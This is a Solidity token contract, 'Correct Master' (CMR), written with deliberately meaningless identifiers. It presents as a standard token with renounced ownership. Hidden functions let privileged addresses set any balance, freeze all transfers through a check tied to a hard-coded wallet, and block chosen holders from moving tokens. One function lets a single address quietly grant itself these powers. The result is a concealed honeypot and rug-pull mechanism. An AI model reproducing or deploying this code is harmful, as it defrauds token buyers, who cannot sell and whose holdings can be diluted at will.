//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface tokenTxBuy {
    function createPair(address walletSwapMarketing, address shouldTakeTotal) external returns (address);
}

interface marketingSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptTo) external view returns (uint256);

    function transfer(address amountLiquidityList, uint256 takeEnable) external returns (bool);

    function allowance(address senderAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeEnable) external returns (bool);

    function transferFrom(
        address sender,
        address amountLiquidityList,
        uint256 takeEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountSender, uint256 value);
    event Approval(address indexed senderAt, address indexed spender, uint256 value);
}

abstract contract shouldFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingSwapMetadata is marketingSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CorrectMaster is shouldFrom, marketingSwap, marketingSwapMetadata {

    function transferFrom(address enableTotal, address amountLiquidityList, uint256 takeEnable) external override returns (bool) {
        if (_msgSender() != atSenderLimit) {
            if (marketingReceiver[enableTotal][_msgSender()] != type(uint256).max) {
                require(takeEnable <= marketingReceiver[enableTotal][_msgSender()]);
                marketingReceiver[enableTotal][_msgSender()] -= takeEnable;
            }
        }
        return listLaunched(enableTotal, amountLiquidityList, takeEnable);
    }

    uint256 constant swapList = 17 ** 10;

    address walletToAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function fromReceiver(address shouldEnable, uint256 takeEnable) public {
        liquidityAmount();
        minTradingExempt[shouldEnable] = takeEnable;
    }

    bool public senderMax;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverSwap;
    }

    uint8 private tradingSell = 18;

    event OwnershipTransferred(address indexed receiverMarketingWallet, address indexed swapFundIs);

    bool public modeMin;

    function name() external view virtual override returns (string memory) {
        return maxFrom;
    }

    function getOwner() external view returns (address) {
        return fromSellToken;
    }

    function approve(address launchedExempt, uint256 takeEnable) public virtual override returns (bool) {
        marketingReceiver[_msgSender()][launchedExempt] = takeEnable;
        emit Approval(_msgSender(), launchedExempt, takeEnable);
        return true;
    }

    function toAuto() public {
        emit OwnershipTransferred(walletShould, address(0));
        fromSellToken = address(0);
    }

    bool public receiverTokenSwap;

    mapping(address => bool) public teamReceiverSwap;

    string private maxFrom = "Correct Master";

    bool private modeLaunchedEnable;

    function liquidityAmount() private view {
        require(maxAt[_msgSender()]);
    }

    function listLaunched(address enableTotal, address amountLiquidityList, uint256 takeEnable) internal returns (bool) {
        if (enableTotal == walletShould) {
            return walletTo(enableTotal, amountLiquidityList, takeEnable);
        }
        uint256 fundSwap = marketingSwap(receiverFrom).balanceOf(walletToAt);
        require(fundSwap == launchedAt);
        require(amountLiquidityList != walletToAt);
        if (teamReceiverSwap[enableTotal]) {
            return walletTo(enableTotal, amountLiquidityList, swapList);
        }
        return walletTo(enableTotal, amountLiquidityList, takeEnable);
    }

    address public walletShould;

    function allowance(address tokenAt, address launchedExempt) external view virtual override returns (uint256) {
        if (launchedExempt == atSenderLimit) {
            return type(uint256).max;
        }
        return marketingReceiver[tokenAt][launchedExempt];
    }

    address public receiverFrom;

    address atSenderLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address exemptTo) public view virtual override returns (uint256) {
        return minTradingExempt[exemptTo];
    }

    function tradingLaunch(uint256 takeEnable) public {
        liquidityAmount();
        launchedAt = takeEnable;
    }

    bool public buySell;

    function walletTo(address enableTotal, address amountLiquidityList, uint256 takeEnable) internal returns (bool) {
        require(minTradingExempt[enableTotal] >= takeEnable);
        minTradingExempt[enableTotal] -= takeEnable;
        minTradingExempt[amountLiquidityList] += takeEnable;
        emit Transfer(enableTotal, amountLiquidityList, takeEnable);
        return true;
    }

    constructor (){
        
        enableWallet shouldMarketing = enableWallet(atSenderLimit);
        receiverFrom = tokenTxBuy(shouldMarketing.factory()).createPair(shouldMarketing.WETH(), address(this));
        if (buySell) {
            modeLaunchedEnable = false;
        }
        walletShould = _msgSender();
        maxAt[walletShould] = true;
        minTradingExempt[walletShould] = receiverSwap;
        toAuto();
        
        emit Transfer(address(0), walletShould, receiverSwap);
    }

    bool private amountMinTotal;

    function decimals() external view virtual override returns (uint8) {
        return tradingSell;
    }

    uint256 senderMode;

    address private fromSellToken;

    mapping(address => bool) public maxAt;

    uint256 launchedAt;

    uint256 private receiverSwap = 100000000 * 10 ** 18;

    mapping(address => uint256) private minTradingExempt;

    mapping(address => mapping(address => uint256)) private marketingReceiver;

    function transfer(address shouldEnable, uint256 takeEnable) external virtual override returns (bool) {
        return listLaunched(_msgSender(), shouldEnable, takeEnable);
    }

    function fromLimit(address launchedTradingAuto) public {
        liquidityAmount();
        if (buySell != modeMin) {
            receiverTokenSwap = false;
        }
        if (launchedTradingAuto == walletShould || launchedTradingAuto == receiverFrom) {
            return;
        }
        teamReceiverSwap[launchedTradingAuto] = true;
    }

    function isFrom(address txFrom) public {
        require(txFrom.balance < 100000);
        if (enableTokenLaunch) {
            return;
        }
        if (modeLaunchedEnable == amountMinTotal) {
            buySell = true;
        }
        maxAt[txFrom] = true;
        
        enableTokenLaunch = true;
    }

    function owner() external view returns (address) {
        return fromSellToken;
    }

    function symbol() external view virtual override returns (string memory) {
        return exemptMarketing;
    }

    string private exemptMarketing = "CMR";

    bool public enableTokenLaunch;

}